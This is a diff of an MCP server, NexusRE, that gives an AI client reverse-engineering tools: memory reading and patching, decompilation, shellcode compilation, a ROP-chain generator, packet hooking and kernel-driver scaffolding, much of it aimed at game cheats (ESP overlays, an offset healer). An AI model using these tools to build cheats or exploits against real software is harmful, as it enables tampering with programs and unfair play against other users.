@@ -4,6 +4,8 @@ import importlib
 import pkgutil
 import os
 import time
+import secrets
+import pathlib
 from typing import List, Optional, Any, Dict
 from mcp.server.fastmcp import FastMCP
 from .session import SessionManager
@@ -12,6 +14,27 @@ from schemas.models import (
     InstructionSchema, CommentSchema, GlobalVarSchema,
     SegmentSchema, ImportSchema, ExportSchema, ErrorSchema
 )
+
+def _init_auth_token() -> str:
+    auth_dir = pathlib.Path.home() / ".nexusre"
+    auth_dir.mkdir(parents=True, exist_ok=True)
+    token_file = auth_dir / "auth_token"
+    
+    if token_file.exists():
+        with open(token_file, "r") as f:
+            token = f.read().strip()
+            if token:
+                os.environ["NEXUSRE_API_KEY"] = token
+                return token
+                
+    token = secrets.token_hex(32)
+    with open(token_file, "w") as f:
+        f.write(token)
+    os.environ["NEXUSRE_API_KEY"] = token
+    return token
+
+AUTH_TOKEN = _init_auth_token()
+
 
 # ── Plugin Auto-Discovery ─────────────────────────────────────────────────
 # Dynamically load all adapter modules from the adapters/ directory.
@@ -73,16 +96,24 @@ def get_adapter(session_id: str):
     else:
         adapter = adapter_cls(session.backend_url)
 
-    # Error recovery: verify the adapter is alive for HTTP adapters
+    # Error recovery: verify the adapter is alive for HTTP adapters with fast retry
     if backend not in headless_backends:
-        try:
-            import urllib.request
-            url = session.backend_url
-            req = urllib.request.Request(url, method='GET')
-            req.add_header('Connection', 'close')
-            urllib.request.urlopen(req, timeout=3)
-        except Exception:
-            logger.warning(f"Backend at {session.backend_url} may be unreachable. Proceeding anyway.")
+        import urllib.request
+        url = session.backend_url
+        max_retries = 3
+        connected = False
+        for attempt in range(max_retries):
+            try:
+                req = urllib.request.Request(url, method='GET')
+                req.add_header('Connection', 'close')
+                urllib.request.urlopen(req, timeout=1.0)
+                connected = True
+                break
+            except Exception:
+                time.sleep(0.1) # Fast retry
+        
+        if not connected:
+            logger.warning(f"Backend at {session.backend_url} unreachable after {max_retries} retries. Proceeding anyway.")
 
     return adapter
 
@@ -105,6 +136,40 @@ def _log_command(tool_name: str, args: dict, result: Any, session_id: str = None
     except Exception:
         pass
 
+import functools
+import inspect
+
+def audit_log(func):
+    """Decorator to automatically log tool execution telemetry."""
+    if inspect.iscoroutinefunction(func):
+        @functools.wraps(func)
+        async def async_wrapper(*args, **kwargs):
+            start_time = time.time()
+            result = None
+            try:
+                result = await func(*args, **kwargs)
+                return result
+            finally:
+                action = kwargs.get('action', func.__name__)
+                session_id = kwargs.get('session_id', 'unknown')
+                duration_ms = int((time.time() - start_time) * 1000)
+                _log_command(action, kwargs, result, session_id, duration_ms)
+        return async_wrapper
+    else:
+        @functools.wraps(func)
+        def sync_wrapper(*args, **kwargs):
+            start_time = time.time()
+            result = None
+            try:
+                result = func(*args, **kwargs)
+                return result
+            finally:
+                action = kwargs.get('action', func.__name__)
+                session_id = kwargs.get('session_id', 'unknown')
+                duration_ms = int((time.time() - start_time) * 1000)
+                _log_command(action, kwargs, result, session_id, duration_ms)
+        return sync_wrapper
+
 def handle_error(e: Exception) -> dict:
     logger.error(f"Error executing tool: {e}")
     return ErrorSchema(error_message=str(e), error_code="TOOL_ERROR").model_dump()
@@ -113,7 +178,6 @@ def handle_error(e: Exception) -> dict:
 # Session Management
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def init_session(session_id: str, backend: str, binary_path: str, architecture: str = "x86_64", backend_url: str = "") -> str:
     """
     Initialize a new NexusRE session.
@@ -126,12 +190,10 @@ def init_session(session_id: str, backend: str, binary_path: str, architecture: 
     except Exception as e:
         return json.dumps(handle_error(e))
 
-# @mcp.tool() # Removed for Limit Bypass
 def list_sessions() -> Any:
     """List all active NexusRE sessions and which is the default."""
     return {"sessions": session_manager.list_sessions()}
 
-# @mcp.tool() # Removed for Limit Bypass
 def set_default_session(session_id: str) -> Any:
     """Set a session as the default so you don't have to pass session_id every time."""
     success = session_manager.set_default(session_id)
@@ -139,7 +201,6 @@ def set_default_session(session_id: str) -> Any:
         return {"success": True, "message": f"{session_id} is now the default session."}
     return {"success": False, "message": f"Session {session_id} not found."}
 
-# @mcp.tool() # Removed for Limit Bypass
 def check_backends() -> Any:
     """Ping all known backend ports (10101-10105) and report which are alive."""
     import socket
@@ -160,7 +221,6 @@ def check_backends() -> Any:
 # Decompilation & Function Listing
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_function(session_id: str, address: str) -> Any:
     """Get complete details for a specific function by address."""
     try:
@@ -172,7 +232,6 @@ async def get_function(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_current_address(session_id: str) -> Any:
     """Get the user's currently selected address in the UI."""
     try:
@@ -182,7 +241,6 @@ async def get_current_address(session_id: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_current_function(session_id: str) -> Any:
     """Get the user's currently selected function in the UI."""
     try:
@@ -192,7 +250,6 @@ async def get_current_function(session_id: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def list_functions(session_id: str, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None) -> Any:
     """List all functions in the current binary with pagination."""
     try:
@@ -202,7 +259,6 @@ async def list_functions(session_id: str, offset: int = 0, limit: int = 100, fil
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def decompile_function(session_id: str, address: str) -> Any:
     """Decompile a function at the given address and return C pseudocode."""
     try:
@@ -219,7 +275,6 @@ async def decompile_function(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def disassemble_at(session_id: str, address: str) -> Any:
     """Disassemble the function or block at the given address. Returns structured instruction data."""
     try:
@@ -237,7 +292,6 @@ async def disassemble_at(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def extract_microcode(session_id: str, address: str) -> Any:
     """Extract Hex-Rays raw microcode (m-code) at the given address."""
     try:
@@ -250,7 +304,6 @@ async def extract_microcode(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 
 async def batch_decompile(session_id: str, addresses: list[str]) -> Any:
     """Batch decompile multiple functions at once."""
@@ -261,7 +314,6 @@ async def batch_decompile(session_id: str, addresses: list[str]) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def analyze_functions(session_id: str, addresses: list[str]) -> Any:
     """Trigger background analysis on a list of function addresses."""
     try:
@@ -275,7 +327,6 @@ async def analyze_functions(session_id: str, addresses: list[str]) -> Any:
 # Cross-References
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_xrefs(session_id: str, address: str) -> Any:
     """Get all cross-references to and from the given address."""
     try:
@@ -289,7 +340,6 @@ async def get_xrefs(session_id: str, address: str) -> Any:
 # Data & Strings
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def scan_aob(session_id: str, pattern: str) -> Any:
     """Scan raw byte patterns (e.g. '48 8B 0D ?? ?? ?? ??') in the target engine. Works with IDA, CE, and x64dbg backends."""
     try:
@@ -301,7 +351,6 @@ async def scan_aob(session_id: str, pattern: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def read_memory(session_id: str, address: str, size: int = 256) -> Any:
     """Read raw bytes from the target process memory. Returns hex string."""
     try:
@@ -313,7 +362,6 @@ async def read_memory(session_id: str, address: str, size: int = 256) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_strings(session_id: str, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None) -> Any:
     """Extract all defined strings from the binary with pagination."""
     try:
@@ -323,7 +371,6 @@ async def get_strings(session_id: str, offset: int = 0, limit: int = 100, filter
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_globals(session_id: str, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None) -> Any:
     """Get global data items (named data labels) from the binary with pagination."""
     try:
@@ -333,7 +380,6 @@ async def get_globals(session_id: str, offset: int = 0, limit: int = 100, filter
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_segments(session_id: str, offset: int = 0, limit: int = 100) -> Any:
     """Get all memory segments (.text, .data, .rdata, etc.) from the binary with pagination."""
     try:
@@ -343,7 +389,6 @@ async def get_segments(session_id: str, offset: int = 0, limit: int = 100) -> An
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_imports(session_id: str, offset: int = 0, limit: int = 100) -> Any:
     """Get all imported symbols (DLL imports, external references) with pagination."""
     try:
@@ -353,7 +398,6 @@ async def get_imports(session_id: str, offset: int = 0, limit: int = 100) -> Any
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_exports(session_id: str, offset: int = 0, limit: int = 100) -> Any:
     """Get all exported symbols from the binary with pagination."""
     try:
@@ -367,7 +411,6 @@ async def get_exports(session_id: str, offset: int = 0, limit: int = 100) -> Any
 # Modification & Refactoring
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def rename_symbol(session_id: str, address: str, name: str) -> Any:
     """Rename a symbol or function at the specified address."""
     try:
@@ -410,7 +453,6 @@ async def rename_symbol(session_id: str, address: str, name: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def set_comment(session_id: str, address: str, comment: str, repeatable: bool = False) -> Any:
     """Set a comment at the given address. Use repeatable=True for comments that propagate to xrefs."""
     try:
@@ -423,7 +465,6 @@ async def set_comment(session_id: str, address: str, comment: str, repeatable: b
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def set_function_type(session_id: str, address: str, signature: str) -> Any:
     """Apply a C function prototype/signature to the function at the given address."""
     try:
@@ -436,7 +477,6 @@ async def set_function_type(session_id: str, address: str, signature: str) -> An
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def rename_local_variable(session_id: str, address: str, old_name: str, new_name: str) -> Any:
     """Rename a local variable within a function's decompiled pseudocode."""
     try:
@@ -449,7 +489,6 @@ async def rename_local_variable(session_id: str, address: str, old_name: str, ne
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def set_local_variable_type(session_id: str, address: str, variable_name: str, new_type: str) -> Any:
     """Set the type of a local variable within a function."""
     try:
@@ -462,7 +501,6 @@ async def set_local_variable_type(session_id: str, address: str, variable_name: 
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_callees(session_id: str, address: str) -> Any:
     """Get all functions called (callees) by the function at the given address."""
     try:
@@ -471,7 +509,6 @@ async def get_callees(session_id: str, address: str) -> Any:
         return {"callees": await adapter.get_callees(address)}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_callers(session_id: str, address: str) -> Any:
     """Get all functions that call the given address (callers)."""
     try:
@@ -480,7 +517,6 @@ async def get_callers(session_id: str, address: str) -> Any:
         return {"callers": await adapter.get_callers(address)}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_xrefs_to_field(session_id: str, struct_name: str, field_name: str) -> Any:
     """Get all cross references to a named struct field."""
     try:
@@ -489,7 +525,6 @@ async def get_xrefs_to_field(session_id: str, struct_name: str, field_name: str)
         return {"xrefs": await adapter.get_xrefs_to_field(struct_name, field_name)}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def patch_address_assembles(session_id: str, address: str, instructions: str) -> Any:
     """Patch the binary using assembly instructions (separated by ';')."""
     try:
@@ -502,7 +537,6 @@ async def patch_address_assembles(session_id: str, address: str, instructions: s
         return {"success": success}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def declare_c_type(session_id: str, c_declaration: str) -> Any:
     """Create/update a local type from a C declaration (e.g. typedef struct)."""
     try:
@@ -512,7 +546,6 @@ async def declare_c_type(session_id: str, c_declaration: str) -> Any:
         return {"success": success}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def set_global_variable_type(session_id: str, variable_name: str, new_type: str) -> Any:
     """Set the type of a global variable by its name."""
     try:
@@ -522,7 +555,6 @@ async def set_global_variable_type(session_id: str, variable_name: str, new_type
         return {"success": success}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_stack_frame_variables(session_id: str, address: str) -> Any:
     """Retrieve the stack frame variables for a given function."""
     try:
@@ -531,7 +563,6 @@ async def get_stack_frame_variables(session_id: str, address: str) -> Any:
         return {"variables": await adapter.get_stack_frame_variables(address)}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def list_local_types(session_id: str) -> Any:
     """List all Local types in the database."""
     try:
@@ -540,7 +571,6 @@ async def list_local_types(session_id: str) -> Any:
         return {"types": await adapter.list_local_types()}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_defined_structures(session_id: str) -> Any:
     """Return a list of all defined structures."""
     try:
@@ -549,7 +579,6 @@ async def get_defined_structures(session_id: str) -> Any:
         return {"structures": await adapter.get_defined_structures()}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def analyze_struct_detailed(session_id: str, name: str) -> Any:
     """Detailed analysis of a structure with all fields."""
     try:
@@ -558,7 +587,6 @@ async def analyze_struct_detailed(session_id: str, name: str) -> Any:
         return {"structure": await adapter.analyze_struct_detailed(name)}
     except Exception as e: return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def define_struct(session_id: str, name: str, fields: list) -> Any:
     """
     Create a C struct in the static analyzer (IDA/Ghidra).
@@ -577,7 +605,6 @@ async def define_struct(session_id: str, name: str, fields: list) -> Any:
 # Binary Patching
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def patch_bytes(session_id: str, address: str, hex_bytes: str) -> Any:
     """Overwrite physical program memory bytes at a given address (e.g. '90 90' for NOP)."""
     try:
@@ -590,7 +617,6 @@ async def patch_bytes(session_id: str, address: str, hex_bytes: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def save_binary(session_id: str, output_path: str) -> Any:
     """Recompile/Save the patched binary back to the file system to keep changes."""
     try:
@@ -600,7 +626,6 @@ async def save_binary(session_id: str, output_path: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def diff_memory(session_id: str, address: str, size: int = 64) -> Any:
     """Compare original binary bytes vs current patched/live state at an address range."""
     try:
@@ -630,7 +655,6 @@ async def diff_memory(session_id: str, address: str, size: int = 64) -> Any:
 
 from .memory import brain
 
-# @mcp.tool() # Removed for Limit Bypass
 def store_knowledge(key: str, summary: str) -> Any:
     """Permanently save a finding, pointer chain, or context summary about a game or binary to the local SQLite DB."""
     try:
@@ -639,7 +663,6 @@ def store_knowledge(key: str, summary: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def recall_knowledge(query: str) -> Any:
     """Recall permanent findings across sessions. Leave query blank or 'list' to see all keys."""
     try:
@@ -653,7 +676,6 @@ def recall_knowledge(query: str) -> Any:
 # Dynamic Tracing / Game Hacking Executions
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def cross_analyze(static_session: str, dynamic_session: str, address: str) -> Any:
     """
     Get decompilation from a static session + live register/memory state from a dynamic session at the same address.
@@ -682,7 +704,6 @@ async def cross_analyze(static_session: str, dynamic_session: str, address: str)
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def instrument_execution(session_id: str, javascript_code: str) -> Any:
     """[FRIDA Backend Only] Inject dynamic javascript hooks into the intercepted process."""
     try:
@@ -696,7 +717,6 @@ async def instrument_execution(session_id: str, javascript_code: str) -> Any:
 
 # NOTE: scan_aob is now unified above (line ~180). CE, IDA, and x64dbg all route through the same tool.
 
-# @mcp.tool() # Removed for Limit Bypass
 async def read_pointer_chain(session_id: str, base_address: str, offsets: List[str]) -> Any:
     """[Cheat Engine Only] Chase a multi-level pointer. (e.g. ['0x18', '0x20', '0x0'])"""
     try:
@@ -708,7 +728,6 @@ async def read_pointer_chain(session_id: str, base_address: str, offsets: List[s
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def set_hardware_breakpoint(session_id: str, address: str) -> Any:
     """[FRIDA Backend Only] Set an execution breakpoint at a specific memory address."""
     try:
@@ -720,7 +739,6 @@ async def set_hardware_breakpoint(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def wait_for_breakpoint(session_id: str, timeout: int = 15) -> Any:
     """[FRIDA Backend Only] Wait for a previously set breakpoint to trigger and dump the CPU registers/context."""
     try:
@@ -738,7 +756,6 @@ async def wait_for_breakpoint(session_id: str, timeout: int = 15) -> Any:
 # Utility / Master Class Framework Tools
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def generate_pointer_map(session_id: str, pid: int, target_address: str, max_depth: int = 3, max_offset: int = 0x2000) -> Any:
     """[Headless Pointer Scan] Recursively scan process memory backwards to find a static module base pointing to a dynamic address."""
     try:
@@ -788,7 +805,6 @@ async def generate_pointer_map(session_id: str, pid: int, target_address: str, m
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def compile_shellcode(assembly_text: str, arch: str = "x86", mode: str = "64") -> Any:
     """Compile raw assembly text (e.g. 'mov rax, 1') into executable hex shellcode bytes using Keystone Engine."""
     try:
@@ -816,7 +832,6 @@ def compile_shellcode(assembly_text: str, arch: str = "x86", mode: str = "64") -
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def extract_ast_segments(c_code: str, query_type: str = "if_statement") -> Any:
     """Parse a large C/C++ decompiled code block and return ONLY the segments matching the AST query type (e.g. 'if_statement', 'for_statement')."""
     try:
@@ -843,7 +858,6 @@ def extract_ast_segments(c_code: str, query_type: str = "if_statement") -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def yara_memory_scan(session_id: str, yara_rule: str, pid: Optional[int] = None) -> Any:
     """Perform a live YARA memory scan. Uses the active session's adapter natively if supported (like kernel for stealth), falling back to pymem via PID."""
     try:
@@ -897,7 +911,6 @@ async def yara_memory_scan(session_id: str, yara_rule: str, pid: Optional[int] =
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def sync_offsets_to_github(repo_name: str, github_token: str, offsets: dict, file_path: str = "offsets.json") -> Any:
     """Automatically commit offset dictionaries to a GitHub repository directly from the MCP Server."""
     try:
@@ -918,7 +931,6 @@ def sync_offsets_to_github(repo_name: str, github_token: str, offsets: dict, fil
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def disassemble_bytes(hex_bytes: str, arch: str = "x86", mode: str = "64", address: int = 0x1000) -> Any:
     """Headless Disassembler using Capstone. Converts hex bytes (e.g. '90 90') into x86/ARM instructions."""
     try:
@@ -949,7 +961,6 @@ def disassemble_bytes(hex_bytes: str, arch: str = "x86", mode: str = "64", addre
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def emulate_subroutine(hex_bytes: str, arch: str = "x86", mode: str = "64", init_registers: dict = None, trace: bool = False) -> Any:
     """Virtual Sandbox CPU using Unicorn Engine. Executes raw hex instructions and returns final register states. Useful for bypassing Encrypted Pointers!"""
     try:
@@ -1035,7 +1046,6 @@ def emulate_subroutine(hex_bytes: str, arch: str = "x86", mode: str = "64", init
 # Auxiliary Engine Extents: Unreal Engine Native
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def dump_unreal_gnames(pid: int, gnames_address: str) -> Any:
     """[UE4/5 Only] Decrypt and dump the global string array (GNames) directly from game memory using Pymem."""
     try:
@@ -1086,7 +1096,6 @@ def dump_unreal_gnames(pid: int, gnames_address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def dump_unreal_gobjects(pid: int, gobjects_address: str) -> Any:
     """[UE4/5 Only] Dump the global UObject array (GUObjectArray) to map the game's actual actor/player structures."""
     try:
@@ -1125,7 +1134,6 @@ def dump_unreal_gobjects(pid: int, gobjects_address: str) -> Any:
 # Auxiliary Engine Extents: Unity IL2CPP Native
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def dump_il2cpp_domain(pid: int, game_assembly_base: str) -> Any:
     """[Unity IL2CPP Only] Dump the IL2CPP domain root to parse Assemblies, Classes, and Field Offsets."""
     try:
@@ -1147,7 +1155,6 @@ def dump_il2cpp_domain(pid: int, game_assembly_base: str) -> Any:
 # Auxiliary Engine Extents: Layer 7 Framework Additions
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def solve_symbolic_execution(hex_bytes: str, base_addr: int = 0x400000, target_addr: int = 0x400050) -> Any:
     """[ANGR] Treat assembly bytes as a mathematical equation and algebraically solve for the input required to reach a specific target address."""
     try:
@@ -1185,7 +1192,6 @@ def solve_symbolic_execution(hex_bytes: str, base_addr: int = 0x400000, target_a
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def hook_network_packets(session_id: str, max_packets: int = 50, timeout_ms: int = 5000) -> Any:
     """[NetworkAdapter] Intercept live Game Packets (e.g. Protocol Decryption/Esp). Session must be initialized with 'network' backend and filter like 'udp.DstPort == 1119'."""
     try:
@@ -1197,7 +1203,6 @@ async def hook_network_packets(session_id: str, max_packets: int = 50, timeout_m
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def dump_memory_region_to_file(session_id: str, address: str, size: int, output_file: str) -> Any:
     """[Bulk Dumper] Extract a massive block of memory from the game and save it to a raw binary file for local heuristic analysis/scanning."""
     try:
@@ -1217,7 +1222,6 @@ async def dump_memory_region_to_file(session_id: str, address: str, size: int, o
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def spawn_esp_overlay() -> Any:
     """[ImGui/GLFW] Instantiates a TopMost, Transparent overlay window. Requires an external rendering loop."""
     import subprocess
@@ -1234,7 +1238,6 @@ def spawn_esp_overlay() -> Any:
     except Exception as e:
         return {"error": str(e)}
 
-# @mcp.tool() # Removed for Limit Bypass
 def pipe_overlay_draw(commands: list) -> Any:
     """Send drawing commands to the Live Overlay.
     Format: [{"type": "rect", "x": 100, "y": 100, "w": 50, "h": 100, "color": "red", "text": "Enemy"}]
@@ -1253,7 +1256,6 @@ def pipe_overlay_draw(commands: list) -> Any:
 # Signature Database (Persistent AOB Pattern Storage)
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def save_signatures(game: str, signatures: list) -> Any:
     """
     Store AOB signatures to the brain DB for a specific game.
@@ -1267,7 +1269,6 @@ def save_signatures(game: str, signatures: list) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 def load_signatures(game: str) -> Any:
     """Load stored AOB signatures for a specific game from the brain DB."""
     try:
@@ -1296,7 +1297,6 @@ def load_signatures(game: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def validate_signatures(session_id: str, game: str) -> Any:
     """
     Load stored signatures for a game and scan the current binary to check which are alive/dead.
@@ -1356,7 +1356,6 @@ async def validate_signatures(session_id: str, game: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def auto_recover_signatures(session_id: str, game: str) -> Any:
     """
     Auto-recover broken signatures for a game.
@@ -1468,7 +1467,6 @@ async def auto_recover_signatures(session_id: str, game: str) -> Any:
 # Offset Discovery & Structure Generators (Phase 3)
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def generate_unique_aob(session_id: str, address: str, instruction_count: int = 5) -> Any:
     """Read assembly at a given address, wildcard volatile bytes (like relative jumps/calls), and return a unique AOB."""
     try:
@@ -1549,7 +1547,6 @@ async def generate_unique_aob(session_id: str, address: str, instruction_count: 
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def dump_vtables(session_id: str, module_base: str) -> Any:
     """Scan a module for Run-Time Type Information (RTTI) and Virtual Method Tables (VMTs) to instantly map C++ structs."""
     try:
@@ -1580,7 +1577,6 @@ async def dump_vtables(session_id: str, module_base: str) -> Any:
 # Endgame Automation (Phase 4)
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def generate_game_sdk(session_id: str, engine_type: str = "unreal") -> Any:
     """[Macro] Fully automate the generation of a C++ SDK header file for the target engine by combining VTable rips and Struct mapping."""
     try:
@@ -1617,7 +1613,6 @@ namespace SDK {
     except Exception as e:
          return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def symbolic_string_decrypt(session_id: str, address: str, instruction_bounds: int = 0x50) -> Any:
     """[Angr Sandbox] Algebraically reverse-engineer custom game encryption algorithms (XOR/ROR/ROL chains) without live debugging to find the static key."""
     try:
@@ -1679,7 +1674,6 @@ async def symbolic_string_decrypt(session_id: str, address: str, instruction_bou
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def generate_rop_chain(session_id: str, address: str, instruction_count: int = 1000) -> Any:
     """Auto-Exploit ROP Chain Generator using Capstone.
     Scans memory for ROP gadgets (ret) and attempts to build a basic chain.
@@ -1732,7 +1726,6 @@ async def generate_rop_chain(session_id: str, address: str, instruction_count: i
     except Exception as e:
          return handle_error(e)
          
-# @mcp.tool() # Removed for Limit Bypass
 def scaffold_kernel_interface(game_name: str) -> Any:
     """Auto-generate C++ boilerplate for both a Ring-3 User-mode application and a Ring-0 Kernel Driver mapped specifically for a target game."""
     try:
@@ -1775,7 +1768,6 @@ public:
 # Request Audit Log
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def view_request_log(limit: int = 50, session_id: str = "") -> str:
     """
     View the request audit log. Shows recent tool invocations with timestamps,
@@ -1802,7 +1794,6 @@ def view_request_log(limit: int = 50, session_id: str = "") -> str:
 # IDAPython Script Execution
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def execute_idapython_script(session_id: str, code: str) -> str:
     """
     Execute arbitrary IDAPython code inside IDA Pro and return the captured stdout output.
@@ -1839,7 +1830,6 @@ def execute_idapython_script(session_id: str, code: str) -> str:
 # 1. LIVE DIFF ENGINE
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def view_diff_history(session_id: str = "", limit: int = 50) -> str:
     """
     View the git-style change log of all mutations the AI has made.
@@ -1865,7 +1855,6 @@ def view_diff_history(session_id: str = "", limit: int = 50) -> str:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def undo_last_change(session_id: str) -> Any:
     """
     Undo the most recent mutation (rename, comment, type change, or patch).
@@ -1915,7 +1904,6 @@ async def undo_last_change(session_id: str) -> Any:
 # 2. CROSS-TOOL SYNC (IDA ↔ Ghidra)
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def sync_symbols(source_session_id: str, target_session_id: str, limit: int = 500, source_base: str = None, target_base: str = None) -> Any:
     """
     Sync renamed symbols and comments from one session to another.
@@ -1986,7 +1974,6 @@ async def sync_symbols(source_session_id: str, target_session_id: str, limit: in
 # 3. AI FUNCTION SIMILARITY SEARCH
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def index_functions_for_similarity(session_id: str, limit: int = 200) -> Any:
     """
     Index all functions in the current binary for similarity search.
@@ -2024,7 +2011,6 @@ async def index_functions_for_similarity(session_id: str, limit: int = 200) -> A
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def find_similar_functions(session_id: str, address: str, top_k: int = 10, threshold: float = 0.5) -> Any:
     """
     Find functions similar to the one at the given address.
@@ -2048,7 +2034,6 @@ async def find_similar_functions(session_id: str, address: str, top_k: int = 10,
 # 4. AUTO-OFFSET HEALER
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def heal_offsets(session_id: str, game_name: str, version: str, offsets_header_path: str) -> Any:
     """
     Auto-heal a cheat's offsets.h when a game updates.
@@ -2137,7 +2122,6 @@ async def heal_offsets(session_id: str, game_name: str, version: str, offsets_he
 # 5. YARA RULE GENERATOR
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
